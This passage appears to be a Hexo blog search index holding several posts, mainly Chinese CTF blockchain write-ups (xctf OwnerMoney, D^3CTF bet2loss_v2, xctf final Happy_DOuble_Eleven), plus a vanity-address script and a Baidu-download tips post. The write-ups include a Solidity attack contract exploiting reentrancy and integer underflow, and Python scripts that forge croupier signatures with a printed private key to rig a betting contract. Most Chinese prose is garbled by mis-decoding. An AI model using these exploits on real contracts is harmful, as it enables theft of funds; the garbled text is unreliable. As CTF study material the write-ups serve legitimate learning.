ï¼Œæ‰€ä»¥å°±æœ‰äº†æ€è·¯ï¼šè®¾ç½®ä¸€ä¸ªåˆå§‹å€¼ä¸º true çš„å˜é‡ï¼Œæ¯æ¬¡è°ƒç”¨ isOwner()æ—¶ï¼Œå°†å…¶å–åå†è¿”å›žã€‚è¿™æ ·ä¾¿æ»¡è¶³äº†æˆ‘ä»¬æ˜¯ owner ï¼Œåªéœ€å†æ»¡è¶³ buyTimes[msg.sender] &gt;= 100 å‘çŽ°åªæœ‰ sell å‡½æ•°ï¼Œä¼šæœ‰ buyTimes[msg.sender] -= 1 çš„æ“ä½œï¼Œå…¶å®žè¿™æ˜¯é‡å…¥é—®é¢˜ï¼Œè¿™é‡Œéœ€è¦æ»¡è¶³ require(_amount &gt;= 200) ï¼Œä½†æ˜¯ buy åªèƒ½ç»™ 100 ï¼Œå…¸åž‹çš„è–…ç¾Šæ¯›é—®é¢˜ï¼Œæœ€åŽå†åˆ©ç”¨æ•´æ•°ä¸‹æº¢å³å¯æ»¡è¶³ buyTimes[msg.sender] &gt;= 100 exp12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152pragma solidity ^0.4.23;contract attack1 &#123; address instance_address = 0xb9f9a887b06b54ab851928f3bc721b120876196b ; OwnerMoney target = OwnerMoney(instance_address); bool public flag = true; uint public have_sell = 0; constructor() payable &#123;&#125; function isOwner(address) public returns (bool)&#123; flag = !flag; return flag; &#125; function hack1() &#123; target.change(address(this)); target.change_Owner(); target.buy.value(1)(); &#125; function hack2() &#123; target.sell(200); &#125; function hack3(string b64email) &#123; target.payforflag(b64email); &#125; function() payable &#123; if (have_sell &lt; 1) &#123; have_sell += 1; target.sell(200); &#125; &#125;&#125;contract attack2 &#123; address instance_address = 0xb9f9a887b06b54ab851928f3bc721b120876196b; OwnerMoney target = OwnerMoney(instance_address); constructor() payable &#123;&#125; function hack1() &#123; target.buy.value(1)(); target.transfer(0xde76c7f9fff36f128d153ee068ccd5a0e7b9afff,100); &#125;&#125;]]></content>
      <categories>
        <category>Solidity</category>
      </categories>
      <tags>
        <tag>Blockchain</tag>
        <tag>xctf é«˜æ ¡ç«™â€œç–«â€</tag>
        <tag>OwnerMoney</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Neat Download Manager Mac]]></title>
    <url>%2F2020%2FNeatDownloadManagerMac%2F</url>
    <content type="text"><![CDATA[å‰è¨€ éœ€è¦ä»Žç™¾åº¦äº‘ä¸‹è½½ä¸€äº›ä¸œè¥¿ï¼Œä½†è¿«äºŽå¤ªç©·ï¼Œç™¾åº¦äº‘ SVIP ä¸ç¬¦åˆæˆ‘çš„èº«ä»½ï¼Œå°±æœé›†äº†ä¸€äº›ç™¾åº¦äº‘æé€Ÿä¸‹è½½çš„æ–¹æ³• ä¹‹å‰ windows æ˜¯ç”¨ Tampermonkey + IDM mac æ²¡æœ‰ IDM ï¼Œå°è¯•è¿‡ folx pro ,æ— å¥ˆæ²¡æ³•ä¸‹è½½ç™¾åº¦äº‘æ–‡ä»¶ æœ€åŽæ‰¾åˆ°äº† Neat Download Manager ï¼Œæ•ˆæžœå¦‚ä¸Šå›¾æ‰€ç¤ºï¼ˆä¸‹è½½é€Ÿåº¦å’Œç½‘ç»œå¸¦å®½ä¹Ÿæœ‰å…³ç³»ï¼‰ï¼Œè‡³å°‘ä¸æ˜¯ç™¾åº¦äº‘çš„å‡ åKæˆ–è€…ä¸€ç™¾å¤šKäº† å®‰è£…æ–¹æ³• å®‰è£…æ²¹çŒ´ Tampermonkey å®‰è£…ç½‘ç›˜åŠ©æ‰‹ ç½‘ç›˜åŠ©æ‰‹ å®‰è£… Neat Download Manager Mac ,é“¾æŽ¥: https://pan.baidu.com/s/1787cmz7Y60qX1-y32kZtRA æå–ç : pika ä½¿ç”¨æ–¹æ³•ç›®å‰åªèƒ½åœ¨ç™¾åº¦ç½‘ç›˜çš„ã€Œç®¡ç†é¡µé¢ã€ä¸Šä½¿ç”¨ï¼Œä¹Ÿå°±æ˜¯è¿™é‡Œï¼šhttps://pan.baidu.com/disk/home ä½¿ç”¨æµè§ˆå™¨ï¼Œç™»å½•è‡ªå·±çš„ç™¾åº¦ç½‘ç›˜å¸å·ã€‚å¦‚æžœæ˜¯åˆ«äººåˆ†äº«çš„èµ„æºï¼Œå¯ä»¥å…ˆå­˜åˆ°è‡ªå·±çš„ç½‘ç›˜ä¸Š é€‰æ‹©è¦ä¸‹è½½çš„æ–‡ä»¶ï¼Œç‚¹å‡»é¡µé¢é‡Œçš„ ç”Ÿæˆé“¾æŽ¥ æ¥èŽ·å–åŠ é€Ÿä¸‹è½½åœ°å€ å³é”®é€‰æ‹© Download By NeatDownloadManager ï¼Œç„¶åŽç¡®å®šä¸‹è½½]]></content>
      <categories>
        <category>tools</category>
      </categories>
      <tags>
        <tag>tools</tag>
        <tag>baiduyun</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[ethereumç”Ÿæˆç‰¹å®šåŽç¼€è´¦å·çš„è„šæœ¬]]></title>
    <url>%2F2020%2Fgenerate-address%2F</url>
    <content type="text"><![CDATA[å‰è¨€ethereum ç”Ÿæˆç‰¹å®šåŽç¼€è´¦æˆ·çš„è„šæœ¬ï¼ŒåŒ…æ‹¬ å¤–éƒ¨è´¦æˆ· å’Œ åˆçº¦è´¦æˆ· 1234567891011121314151617181920212223242526272829303132333435from ethereum import utilsimport os, sys# generate EOA with appendix 1b1bdef generate_eoa1(): priv = utils.sha3(os.urandom(4096)) addr = utils.checksum_encode(utils.privtoaddr(priv)) while not addr.lower().endswith("1b1b"): priv = utils.sha3(os.urandom(4096)) addr = utils.checksum_encode(utils.privtoaddr(priv)) print('Address: &#123;&#125;\nPrivate Key: &#123;&#125;'.format(addr, priv.hex()))# generate EOA with the ability to deploy contract with appendix 1b1bdef generate_eoa2(): priv = utils.sha3(os.urandom(4096)) addr = utils.checksum_encode(utils.privtoaddr(priv)) while not utils.decode_addr(utils.mk_contract_address(addr, 0)).endswith("1b1b"): priv = utils.sha3(os.urandom(4096)) addr = utils.checksum_encode(utils.privtoaddr(priv)) print('Address: &#123;&#125;\nPrivate Key: &#123;&#125;'.format(addr, priv.hex()))if __name__ == "__main__": if sys.argv[1] == "1": generate_eoa1() elif sys.argv[1] == "2": generate_eoa2() else: print("Please enter valid argument") generate_eoa1 å¯ä»¥ç›´æŽ¥ç”Ÿæˆä½Žå››ä½ä¸º 1b1b çš„å¤–éƒ¨è´¦æˆ· generate_eoa2 å¯ä»¥ç”Ÿæˆä¸€ä¸ªå¤–éƒ¨è´¦æˆ·ï¼Œè¯¥å¤–éƒ¨è´¦æˆ·éƒ¨ç½²çš„ç¬¬ä¸€ä¸ªæ™ºèƒ½åˆçº¦çš„åœ°å€ä½Žå››ä½ä¸º 1b1b]]></content>
      <categories>
        <category>Scripts</category>
      </categories>
      <tags>
        <tag>Scripts</tag>
        <tag>ethereum</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[gitalk]]></title>
    <url>%2F2020%2Fgitalk%2F</url>
    <content type="text"><![CDATA[å‰è¨€åšå®¢å¢žåŠ è¯„è®ºåŠŸèƒ½å•¦ï¼ï¼ï¼ï¼ å‚è€ƒhttps://www.jianshu.com/p/b5f509f25872 Pursue your passion, and everything else will fall into place. This is not being romantic. This is the highest order of pragmatism. â€”â€” åŠ å¸ƒé‡ŒåŸƒçˆ¾Â·å‰ç¦èŒ² éšä¾¿è®°å½•ä¸€ä¸‹ï¼Œæ²¡æœ‰ä»€ä¹ˆé€»è¾‘æ€§â†“ ä¹‹å‰åšå®¢æ˜¯éƒ¨ç½²åœ¨ github + coding ä¸Šï¼ŒåŽæ¥ä¸çŸ¥é“å‡ºäº†ä»€ä¹ˆé—®é¢˜ï¼Œåªæœ‰æŒ‚å…¨å±€ä»£ç†æ‰èƒ½è®¿é—®ï¼ŒåŽå°±æŠŠåšå®¢è¿ç§»åˆ°äº† VPS ä¸Šâ†“ è¯„è®ºåŠŸèƒ½å…¶å®žä¸€ç›´æƒ³åŠ ä¸ŠåŽ»ï¼Œç”±äºŽæ²¡æœ‰æ‰¾åˆ°åˆé€‚åˆå¥½çœ‹çš„ï¼Œå°±ä¸€ç›´æ²¡æœ‰åŠ â†“ æœ€åˆå°è¯•çš„æ˜¯ disqus ï¼ŒæŒºç¾Žè§‚ï¼Œä½†æ— å¥ˆç”±äºŽåŠ è½½é€Ÿåº¦é—®é¢˜è¿˜æ˜¯æ”¾å¼ƒäº†â†“ å¶ç„¶å‘çŽ° gitalk è¿™ä¸ªç¥žå¥‡çš„è¯„è®ºç³»ç»Ÿï¼Œå°±å°è¯•äº†ä¸€ä¸‹ï¼Œè¿˜æŒºé¡ºåˆ©ï¼Œä¸€æ¬¡å°±è®¾ç½®æˆåŠŸï¼Œæ•ˆæžœå›¾ä¹ŸæŒºå¥½çœ‹â†“ åšå®¢ç»ˆäºŽæœ‰è¯„è®ºç³»ç»Ÿå•¦ã€Œå•¦å•¦å•¦ã€ï¼Œä¹Ÿå¯ä»¥ç•™è¨€å“¦ æ™“æœˆè€æ¿çš„è¿™é¦–æ­Œä¹Ÿå¥½å¬å“¦ï¼Œå“ˆå“ˆå“ˆå“ˆå“ˆ]]></content>
      <categories>
        <category>tools</category>
      </categories>
      <tags>
        <tag>Hexo</tag>
        <tag>gitalk</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[D^3CTF 2019 bet2loss_v2]]></title>
    <url>%2F2019%2Fbet2loss-v2%2F</url>
    <content type="text"><![CDATA[å‰è¨€åˆ©ç”¨åˆšè¿‡åŽ»çš„å‘¨æœ«å‚åŠ äº† D^3CTF ï¼Œåšäº†ä¸€é“åŒºå—é“¾çš„é¢˜ç›®ï¼Œåœ¨æ­¤è®°å½•ä¸€ä¸‹ï¼š ä»¥å¤ªåŠ Kovan æµ‹è¯•é“¾ åˆçº¦åœ°å€åŠ¨æ€ç”Ÿæˆï¼Œæ¯ä¸ªé˜Ÿä¼åˆçº¦åœ°å€åˆ†å¼€ï¼ˆä½†æ˜¯åˆ†å‘åˆçº¦åœ°å€çš„è´¦æˆ·æ˜¯åŒä¸€ä¸ªè´¦æˆ·ï¼Œæ‰€ä»¥è¯´è¿˜æ˜¯å¯ä»¥æŸ¥åˆ°å…¶ä»–äººåœ¨é“¾ä¸Šçš„äº¤æ˜“2333ï¼‰ hash-reveal-commit éšæœºæ•° å‡ºé¢˜äººé‡‡ç”¨çš„æ˜¯å‰åŽå°äº¤äº’çš„æ–¹æ³•ï¼Œæ‰€ä»¥é¢˜ç›®æ²¡æœ‰å¤çŽ°ï¼Œè®°å½•ä¸‹è§£é¢˜çš„æ€æƒ³ é¢˜ç›®è¦æ±‚åœ¨ä¸Šé¢å›¾é‡Œï¼Œå®˜æ–¹expå…¥å£ é¢˜ç›® exp ï¼šhttps://github.com/hitcxy/blockchain-challenges/tree/master/2019/D3CTF/bet2loss_v2 åˆçº¦ä»£ç ä¸»è¦å‡½æ•°ä¸º placeBet å’Œ settleBet ï¼Œ placeBet å»ºç«‹èµŒåšï¼ŒsettleBet å¼€å¥– å‡ºé¢˜äººåˆ©ç”¨äº† hash-reveal-commit éšæœºæ•°çš„æ€æƒ³ï¼Œéšæœºæ•°çš„å®žçŽ°æ”¾åœ¨äº†æœåŠ¡ç«¯ ç”¨æˆ·é¦–å…ˆåœ¨å‰å°é€‰å¥½ä¸‹æ³¨çš„æ–¹å¼ ä¹‹åŽæœåŠ¡ç«¯ç”Ÿæˆéšæœºæ•° reveal ã€commitã€commitLastBlock åŠå¯¹ commit å’Œ commitLastBlock å“ˆå¸ŒåŽçš„ç­¾å signatureï¼Œsignature ä¸­åŒ…å« rã€sã€vï¼Œå¹¶è¿”å›ž commitã€commitLastBlockã€rã€sã€v ä¿¡æ¯ å›žåˆ°å‰ç«¯ï¼Œweb3.js é…åˆè¿”å›žçš„æ•°æ®å‘ meta å‘èµ·äº¤æ˜“ï¼Œäº¤æ˜“æˆåŠŸè¢«æ‰“åŒ…ä¹‹åŽå‘åŽå°å‘èµ·è¯·æ±‚ settleBet åŽç«¯æ”¶åˆ°è¯·æ±‚åŽå¯¹è¯¥ commit åšå¼€å¥– é¢˜ç›®è¦æ±‚æ˜¯ balanceOf(you) &gt; 300000 ï¼ˆ é¢˜ç›®æè¿°å¤šäº†ä¸€ä¸ª0ï¼Œå¯ä»¥çœ‹åˆçº¦é‡Œé¢åº”è¯¥æ˜¯ 300000 ï¼‰ 12345function PayForFlag() external returns (bool success)&#123; balances[msg.sender] = balances[msg.sender].sub(300000); emit GetFlag("Get flag!"); return true;&#125; å…ˆæ¥çœ‹ä¸‹åˆçº¦é‡Œçš„ placeBet ä»£ç  123456789101112131415161718192021222324252627282930function placeBet(uint8 betnumber, uint8 modulo, uint40 wager, uint40 commitLastBlock, uint commit, bytes32 r, bytes32 s, uint8 v) external &#123; require (msg.sender != croupier, "croupier cannot bet with himself."); require (isContract(msg.sender)==false, "Only bet with real people."); AirdropCheck(); Bet storage bet = bets[commit]; require (bet.player == address(0), "Bet should be in a 'clean' state."); require (balances[msg.sender] &gt;= wager, "no more balances"); require (modulo &gt; 1 &amp;&amp; modulo &lt;= MAX_MODULO, "modulo should be within range."); require (betnumber &gt;= 0 &amp;&amp; betnumber &lt; modulo, "betnumber should be within range."); require (wager &gt;= MIN_BET &amp;&amp; wager &lt;= MAX_BET, "wager should be within range."); require (block.number &lt;= commitLastBlock, "Commit has expired."); bytes32 signatureHash = keccak256(abi.encodePacked(commitLastBlock, commit)); require (croupier == ecrecover(signatureHash, v, r, s), "ECDSA signature is not valid."); lockedInBets = uint128(wager); balances[msg.sender] = balances[msg.sender].sub(uint256(wager)); emit Commit(commit); bet.wager = wager; bet.betnumber = betnumber; bet.modulo = modulo; bet.placeBlockNumber = uint40(block.number); bet.player = msg.sender;&#125; è¿™é‡Œæœ‰ä¸€ä¸ªç­¾åéªŒè¯ 12bytes32 signatureHash = keccak256(abi.encodePacked(commitLastBlock, commit));require (croupier == ecrecover(signatureHash, v, r, s), "ECDSA signature is not valid."); æ ¹æ®ä¸Šè¿°åˆçº¦é‡Œé¢çš„ç­¾åéªŒè¯å¯¹åº”ä¿®æ”¹æœåŠ¡ç«¯åŽå°ç­¾åéªŒè¯æ–¹å¼ï¼Œå‚è€ƒé“¾æŽ¥ä¸º HCTF2018_bet2loss 123456789101112131415161718192021222324252627def random_num(start=2**20, end=2**30): random = Random() return random.randint(start,end)def random(): result = &#123;'address': config['address'], 'gasPrice': 12000000000&#125; reveal = random_num() result['commit'] = "0x"+sha3.keccak_256(bytes.fromhex(binascii.hexlify(reveal.to_bytes(32, 'big')).decode('utf-8'))).hexdigest() result['commitLastBlock'] = w3.eth.blockNumber + 250 message = binascii.hexlify(result['commitLastBlock'].to_bytes(5,'big')).decode('utf-8')+result['commit'][2:] message_hash = '0x'+sha3.keccak_256(bytes.fromhex(message)).hexdigest() signhash = w3.eth.account.signHash(message_hash, private_key=private_key) result['signature'] = &#123;&#125; result['signature']['r'] = '0x' + binascii.hexlify((signhash['r']).to_bytes(32,'big')).decode('utf-8') result['signature']['s'] = '0x' + binascii.hexlify((signhash['s']).to_bytes(32,'big')).decode('utf-8') result['signature']['v'] = signhash['v'] for key,value in result.items(): print('&#123;key&#125;:&#123;value&#125;'.format(key = key, value = value)) return result,reveal,w3.eth.blockNumber è¿™æ ·çš„è¯ï¼Œæˆ‘ä»¬å°±èƒ½å¤Ÿæ¨¡æ‹ŸæœåŠ¡ç«¯ç”Ÿæˆéšæœºæ•°äº†ï¼Œé€šè¿‡ä¸‹é¢çš„ placeBet äº¤æ˜“ä¾¿èƒ½å¤Ÿé€šè¿‡ç­¾åéªŒè¯ï¼Œç„¶åŽé€šè¿‡ settleBet å¼€å¥–ï¼Œéœ€è¦æ³¨æ„çš„æ˜¯ï¼Œå¼€å¥–è¦ä½¿ç”¨ croupier å¯¹åº”çš„ç§é’¥ç­¾åäº¤æ˜“ croupier å¯¹åº”ç§é’¥å¯ä»¥åœ¨ HCTF2018_bet2loss çš„ settings.py ä¸­æ‰¾åˆ° private_key = b&#39;o\x08\xd7A\x949\x90t#\x81\xe1&quot;4FU:c\xb3\x8a:\xa8k\xee\xf1\xe9\xfc_\xcfa\xe6m\x12&#39; ä¸è¿‡éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œè¿™é‡Œçš„ blocknumber æ˜¯åœ¨äº¤æ˜“ä¸Šé“¾ä¹‹å‰èŽ·å–çš„ï¼Œæ‰€ä»¥è¿™é‡Œå¹¶ä¸æ˜¯ placeBet æœ€åŽä¸Šé“¾çš„åŒºå·ï¼Œè¿™é‡Œæˆ‘é‡‡ç”¨äº†çˆ†ç ´çš„æ–¹æ³•ï¼Œä½¿ç”¨äº†äº”ä¸ªç”¨æˆ·è´¦å·ï¼Œblocknumberåˆ†åˆ«ç­‰äºŽ w3.eth.blocknumber + 2(3ã€4ã€5ã€6) çš„æ–¹å¼è¿›è¡Œäº¤æ˜“ï¼Œå¦‚æžœå“ªä¸ªåŒºå·å¯¹åº”åœ¨é“¾ä¸Šå¼€å¥–ä¸­å¥–çš„è¯ï¼Œå°±ç”¨å¯¹åº”çš„ç”¨æˆ·è´¦å·ç»§ç»­å¼€å¥–å³å¯ï¼ˆå› ä¸ºæ¯ä¸ªè´¦æˆ·å¯ä»¥å¼€å¥–16æ¬¡ï¼Œè¿™é‡Œä¸­ä¸€æ¬¡å¥–æ˜¯ 100*1000=100000 ï¼Œæ‰€ä»¥å†ç”¨ç¬¬ä¸€æ¬¡èŽ·å–çš„éšæœºæ•°å¼€å¥–3æ¬¡å³å¯å¤§äºŽ 300000ï¼‰ 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152result,reveal,blocknumber = random()print("reveal=",reveal)def placeBet1(): modulo = 100 wager = 1000 blocknumber = w3.eth.blockNumber+2 print("blocknumber=",blocknumber) tmp = binascii.hexlify(reveal.to_bytes(32,'big')).decode('utf-8')+binascii.hexlify(blocknumber.to_bytes(32,'big')).decode('utf-8') tmp_hash = '0x'+sha3.keccak_256(bytes.fromhex(tmp)).hexdigest() print("tmp_hash16=",int(tmp_hash, 16)) betnumber = int(tmp_hash, 16) % modulo print("betnumber=",betnumber) commitLastBlock = result['commitLastBlock'] commit = result['commit'] r = result['signature']['r'] s = result['signature']['s'] v = result['signature']['v'] txn = contract_instance.functions.placeBet(betnumber, modulo, wager, commitLastBlock, int(commit,16), r, s, int(v)).buildTransaction( &#123; 'chainId':3, 'nonce':w3.eth.getTransactionCount(Web3.toChecksumAddress(public1)), 'gas':7600000, 'value':Web3.toWei(0,'ether'), 'gasPrice':w3.eth.gasPrice, &#125; ) signed_txn = w3.eth.account.signTransaction(txn,private_key=private1) res = w3.eth.sendRawTransaction(signed_txn.rawTransaction).hex() txn_receipt = w3.eth.waitForTransactionReceipt(res) print(res) return txn_receiptdef settleBet1(): txn = contract_instance.functions.settleBet(reveal).buildTransaction( &#123; 'chainId':3, 'nonce':w3.eth.getTransactionCount(Web3.toChecksumAddress(public_key)), 'gas':7600000, 'value':Web3.toWei(0,'ether'), 'gasPrice':w3.eth.gasPrice, &#125; ) signed_txn = w3.eth.account.signTransaction(txn,private_key=private_key) res = w3.eth.sendRawTransaction(signed_txn.rawTransaction).hex() txn_receipt = w3.eth.waitForTransactionReceipt(res) print(res) return txn_receiptprint(settleBet1()) è‡ªå·±åšé¢˜å½“ä¸­æ˜¯ç¬¬ä¸‰ä¸ªç”¨æˆ·è´¦æˆ·æˆåŠŸå¼€å¥–ï¼Œæ‰€ä»¥ç”¨ç¬¬ä¸‰ä¸ªè´¦æˆ·å†é‡å¤ä¸‰æ¬¡å¼€å¥–å³å¯ï¼Œè¿™é‡Œçš„ reveal æ˜¯ç¬¬ä¸€æ¬¡ placeBet èŽ·å–åˆ°çš„ 12345678910111213141516171819def settleBet3(): reveal = 0x307e29ef txn = contract_instance.functions.settleBet(reveal).buildTransaction( &#123; 'chainId':3, 'nonce':w3.eth.getTransactionCount(Web3.toChecksumAddress(public_key)), 'gas':7600000, 'value':Web3.toWei(0,'ether'), 'gasPrice':w3.eth.gasPrice, &#125; ) signed_txn = w3.eth.account.signTransaction(txn,private_key=private_key) res = w3.eth.sendRawTransaction(signed_txn.rawTransaction).hex() txn_receipt = w3.eth.waitForTransactionReceipt(res) print(res) return txn_receiptfor i in range(3): print(settleBet3())]]></content>
      <categories>
        <category>Solidity</category>
      </categories>
      <tags>
        <tag>Blockchain</tag>
        <tag>D^3CTF</tag>
        <tag>bet2loss_v2</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[xctf final 2019 Happy_DOuble_Eleven]]></title>
    <url>%2F2019%2FHappy-DOuble-Eleven%2F</url>
    <content type="text"><![CDATA[å‰è¨€ å‰ä¸¤å¤©è®¾è®¡äº†ä¸€ä¸ªåŒºå—é“¾çš„é¢˜ç›®ï¼Œå…¶ä¸­å‡ºçŽ°äº†å¾ˆå¤šé—®é¢˜ï¼Œè¿˜å¥½åœ¨æ¯”èµ›ç¬¬ä¸€å¤©å¤œé‡Œä¿®å¤äº†é—®é¢˜ï¼Œåœ¨è¿™é‡Œç®€å•è®°å½•ä¸€ä¸‹ï¼Œç»™å„ä½å¸ˆå‚…å¸¦æ¥äº†éº»çƒ¦ï¼Œè¡¨ç¤ºæ­‰æ„ï¼ˆemmmï¼‰ï¼Œä¸‹é¢å…ˆè¯´æ˜Žä¸€ä¸‹æ¯ä¸ªç‰ˆæœ¬éƒ½ä¿®å¤äº†ä»€ä¹ˆé—®é¢˜ ç¬¬ä¸€ä¸ªç‰ˆæœ¬æˆ‘å°±æ˜¯å¤´è„‘å‘çƒ­ï¼ŒæŠŠé¢˜ç›®è®¾è®¡æˆ 1000 eth å°±èƒ½æ‹¿åˆ° flag ï¼Œæˆ‘çœŸæ˜¯å¼Ÿå¼Ÿè¡Œä¸ºï¼Œè¿˜å¥½åŠæ—¶ä¸‹çº¿ ç¬¬äºŒä¸ªç‰ˆæœ¬æ˜¯ä»»æ„åœ°å€å†™æ¡ä»¶æ²¡æœ‰æŽ§åˆ¶çš„å¾ˆè‹›åˆ»ï¼Œå¯¼è‡´å¤©æž¢åˆ©ç”¨äº†è¿™ä¸€ç‚¹ï¼Œåœ¨éžé¢„æœŸåšå‡ºé¢˜ç›®ä¹‹åŽï¼ŒæŠŠ codex çš„ length ç»™ä¿®æ”¹æˆäº†ä¸€ä¸ªç›¸å¯¹å°çš„æ•°å€¼ï¼Œé€ æˆå…¶ä»–é˜Ÿä¼æ²¡æ³•åšé¢˜ï¼Œè¿™ä¸€ç‚¹è¢«æœ‰å¿ƒä¹‹äººåˆ©ç”¨äº†ï¼Œä»–ä»¬å†™äº†ä¸ªè„šæœ¬ä¸€ç›´æ”»å‡»åˆšéƒ¨ç½²ä¸Šçš„åˆçº¦ï¼Œä¿®æ”¹æ•°ç»„é•¿åº¦ï¼ˆ23333ï¼Œç¡¬ç”Ÿç”Ÿè¢«çŽ©æˆäº†ADï¼‰ ç¬¬ä¸‰ä¸ªç‰ˆæœ¬æ˜¯ä¿®å¤äº†ç‰ˆæœ¬äºŒçš„é—®é¢˜ï¼Œåº”è¯¥æ˜¯å¯ä»¥æ­£å¸¸åšé¢˜çš„ åŽæ¥ä»”ç»†æ€è€ƒäº†ä¸€ä¸‹ï¼Œç‰ˆæœ¬ä¸‰è¿˜æ˜¯æœ‰ä¸€äº›é—®é¢˜çš„ï¼Œä¸è¿‡é€‰æ‰‹åšé¢˜çš„æ—¶å€™æ²¡æœ‰é‡åˆ°ï¼Œä½†æ˜¯æ‹…å¿ƒä¼šå‡ºé—®é¢˜ï¼Œæ‰€ä»¥å°±æœ‰äº†æœ€ç»ˆç‰ˆæœ¬å››ï¼ˆå…¶å®žç‰ˆæœ¬å››ä¹Ÿæœ‰ä¸€äº›é—®é¢˜ï¼Œåœ¨ buy() ä¸­æœ‰ä¸€æ¡ require(storage[0x02]==1) é™åˆ¶ï¼Œè™½ç„¶åœ¨ payforflag åŽä¼šå›žåˆ°åˆå§‹åŒ–çŠ¶æ€ï¼Œä½†æ˜¯è¿™é‡Œå¤´é“ä½¿ç”¨äº† storage å˜é‡ï¼Œå¯¼è‡´ä¸€ä¸ªé—®é¢˜æ˜¯å¦‚æžœæ­£åœ¨è§£é¢˜çš„é˜Ÿä¼ä½¿è¿™ä¸ªæ¡ä»¶æˆç«‹äº†ï¼Œæ°å·§å¦å¤–ä¸€æ”¯é˜Ÿä¼ä¹Ÿæ­£åœ¨è§£é¢˜ï¼Œé‚£ä¹ˆä»–ä»¬å°±å¯ä»¥ä¹˜é¡ºé£Žè½¦ï¼Œå¦‚æžœè¿™é‡Œä½¿ç”¨ memory å˜é‡å°±å¥½äº† å˜æ›´äº†ç‰ˆæœ¬å…¶å®žä¸»è¦è¿˜æ˜¯æƒ³è¦è®©é¢˜ç›®æŒ‰ç…§é¢„æœŸè¿›è¡Œæ±‚è§£ï¼Œç»™å„ä¸ªé˜Ÿä¼é€ æˆäº†éº»çƒ¦ï¼Œè¡¨ç¤ºæŠ±æ­‰ï¼ˆ2333333â€¦..ï¼‰ï¼Œä¸‹é¢ä»‹ç»ä¸€ä¸‹é¢˜ç›® ä»¥å¤ªåŠ Ropsten æµ‹è¯•é“¾ åˆçº¦åœ°å€ï¼šhttps://ropsten.etherscan.io/address/0x168892cb672a747f193eb4aca7b964bfb0aa6476 é¢˜ç›®ï¼šhttps://github.com/hitcxy/blockchain-challenges/tree/master/2019/xctf_final/Happy_DOuble_Eleven EVM é€†å‘ å…ˆè¿›è¡Œåˆçº¦é€†å‘ï¼Œä½¿ç”¨ https://ethervm.io/decompile å¯ä»¥é€†å‘å‡ºä¸‹é¢å‡ ä¸ªå…³é”® function 0x6bc344bc payforflag(string) è¦æ±‚ msg.sender == storage[0x00] è¦æ±‚ msg.sender åŽ 12 ä½ä¸º 0x111 è¦æ±‚ storage[0x06] == 0x03 è¦æ±‚ storage[0x05] &gt; 0x8ac7230489e80000 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273function payforflag(var arg0) &#123; if (msg.sender != storage[0x00] &amp; 0xffffffffffffffffffffffffffffffffffffffff) &#123; revert(memory[0x00:0x00]); &#125; if (msg.sender &amp; 0x0fff != 0x0111) &#123; revert(memory[0x00:0x00]); &#125; memory[0x00:0x20] = msg.sender; memory[0x20:0x40] = 0x06; if (storage[keccak256(memory[0x00:0x40])] != 0x03) &#123; revert(memory[0x00:0x00]); &#125; memory[0x00:0x20] = msg.sender; memory[0x20:0x40] = 0x05; if (storage[keccak256(memory[0x00:0x40])] &lt;= 0x8ac7230489e80000) &#123; revert(memory[0x00:0x00]); &#125; memory[0x00:0x20] = msg.sender; memory[0x20:0x40] = 0x04; storage[keccak256(memory[0x00:0x40])] = 0x00; memory[0x00:0x20] = msg.sender; memory[0x20:0x40] = 0x06; storage[keccak256(memory[0x00:0x40])] = 0x00; storage[0x02] = (storage[0x02] &amp; ~0xff) | 0x00; storage[0x00] = (storage[0x00] &amp; ~(0xff * 0x0100 ** 0x14)) | 0x00; var var0 = 0x00; var var1 = 0x0eed; var var3 = var0; var var2 = 0x01; func_1489(var2, var3); var0 = 0x296b9274d26b7baffb5cc93e1af19012c35ace27ba9acf1badff99d1f76dfa69; var temp0 = arg0; var1 = temp0; var temp1 = memory[0x40:0x60]; var2 = temp1; var3 = var2; var temp2 = var3 + 0x20; memory[var3:var3 + 0x20] = temp2 - var3; memory[temp2:temp2 + 0x20] = memory[var1:var1 + 0x20]; var var4 = temp2 + 0x20; var var6 = memory[var1:var1 + 0x20]; var var5 = var1 + 0x20; var var7 = var6; var var8 = var4; var var9 = var5; var var10 = 0x00; if (var10 &gt;= var7) &#123; label_0F50: var temp3 = var6; var4 = temp3 + var4; var5 = temp3 &amp; 0x1f; if (!var5) &#123; var temp4 = memory[0x40:0x60]; log(memory[temp4:temp4 + var4 - temp4], [stack[-6]]); return; &#125; else &#123; var temp5 = var5; var temp6 = var4 - temp5; memory[temp6:temp6 + 0x20] = ~(0x0100 ** (0x20 - temp5) - 0x01) &amp; memory[temp6:temp6 + 0x20]; var temp7 = memory[0x40:0x60]; log(memory[temp7:temp7 + (temp6 + 0x20) - temp7], [stack[-6]]); return; &#125; &#125; else &#123; label_0F3E: var temp8 = var10; memory[var8 + temp8:var8 + temp8 + 0x20] = memory[var9 + temp8:var9 + temp8 + 0x20]; var10 = temp8 + 0x20; if (var10 &gt;= var7) &#123; goto label_0F50; &#125; else &#123; goto label_0F3E; &#125; &#125;&#125; 0xed21248c Deposit() æ¯æ¬¡ msg.value &gt;= 0x1b1ae4d6e2ef500000 ï¼Œå³ msg.value &gt;= 500 eth ï¼Œç„¶åŽ storage[0x05] += 1 ç»“åˆ payforflag æ¥çœ‹ï¼Œè¿™ä¸ªæ“ä½œä¸çŽ°å®žï¼Œå› ä¸º payforflag ä¸­è¦æ±‚ storage[0x05] &gt; 0x8ac7230489e80000 ï¼Œå³è¦å°† msg.value &gt;= 500 eth è¿›è¡Œ 0x8ac7230489e80000+1 æ¬¡ 12345678function Deposit() &#123; if (msg.value &lt; 0x1b1ae4d6e2ef500000) &#123; return; &#125; memory[0x00:0x20] = msg.sender; memory[0x20:0x40] = 0x05; var temp0 = keccak256(memory[0x00:0x40]); storage[temp0] = storage[temp0] + 0x01;&#125; 0x24b04905 gift() è¦æ±‚ address(msg.sender).code.length == 0 ï¼Œå³åœ¨åˆçº¦ constructor ä¸­è¿è¡Œå³å¯ è¦æ±‚ msg.sender åŽ 12 ä½ä¸º 0x0111 æ»¡è¶³ä¸Šè¿°æ¡ä»¶åŽï¼Œstorage[0x04] = 100 ï¼Œ storage[0x05] 